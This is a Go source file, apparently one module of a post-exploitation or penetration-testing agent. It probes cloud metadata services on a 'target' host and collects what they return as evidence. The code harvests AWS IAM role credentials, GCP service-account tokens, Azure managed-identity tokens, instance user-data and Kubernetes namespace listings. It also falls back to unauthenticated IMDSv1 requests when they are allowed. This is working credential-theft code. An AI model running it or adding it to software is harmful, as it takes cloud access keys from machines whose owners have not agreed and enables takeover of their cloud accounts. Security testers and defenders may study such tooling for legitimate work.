package agent

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// cloudEndpoints are metadata service URLs for major cloud providers.
// These are accessible from any VM/container running on that provider.
var cloudEndpoints = []struct {
	provider string
	url      string
	headers  map[string]string
	key      string // evidence key suffix
}{
	// AWS IMDSv1 (v2 requires PUT for token first)
	{"aws", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil, "iam_role"},
	{"aws", "http://169.254.169.254/latest/meta-data/instance-id", nil, "instance_id"},
	{"aws", "http://169.254.169.254/latest/meta-data/hostname", nil, "hostname"},
	{"aws", "http://169.254.169.254/latest/user-data", nil, "user_data"},

	// AWS IMDSv2 (token-based) — try without token first, many instances still allow v1.

	// GCP
	{"gcp", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		map[string]string{"Metadata-Flavor": "Google"}, "service_account_token"},
	{"gcp", "http://metadata.google.internal/computeMetadata/v1/project/project-id",
		map[string]string{"Metadata-Flavor": "Google"}, "project_id"},
	{"gcp", "http://metadata.google.internal/computeMetadata/v1/instance/zone",
		map[string]string{"Metadata-Flavor": "Google"}, "zone"},

	// Azure
	{"azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		map[string]string{"Metadata": "true"}, "instance_metadata"},
	{"azure", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		map[string]string{"Metadata": "true"}, "managed_identity_token"},

	// DigitalOcean
	{"digitalocean", "http://169.254.169.254/metadata/v1.json", nil, "droplet_metadata"},

	// Kubernetes (from within a pod)
	{"kubernetes", "https://kubernetes.default.svc/api/v1/namespaces", nil, "k8s_namespaces"},
}

// collectCloudMetadata probes cloud metadata services accessible from the target.
func collectCloudMetadata(ctx context.Context) map[string]string {
	meta := make(map[string]string)

	client := &http.Client{
		Timeout: 2 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, ep := range cloudEndpoints {
		if ctx.Err() != nil {
			break
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, ep.url, nil)
		if err != nil {
			continue
		}
		for k, v := range ep.headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8*1024))
		resp.Body.Close()

		if resp.StatusCode == 200 && len(body) > 0 {
			key := fmt.Sprintf("%s_%s", ep.provider, ep.key)
			meta[key] = string(body)
		}
	}

	// If we got an AWS IAM role name, fetch the actual credentials.
	if role, ok := meta["aws_iam_role"]; ok && !strings.Contains(role, "<") {
		role = strings.TrimSpace(role)
		if role != "" {
			credURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, credURL, nil)
			if err == nil {
				resp, err := client.Do(req)
				if err == nil {
					body, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024))
					resp.Body.Close()
					if resp.StatusCode == 200 {
						meta["aws_iam_credentials"] = string(body)
					}
				}
			}
		}
	}

	return meta
}
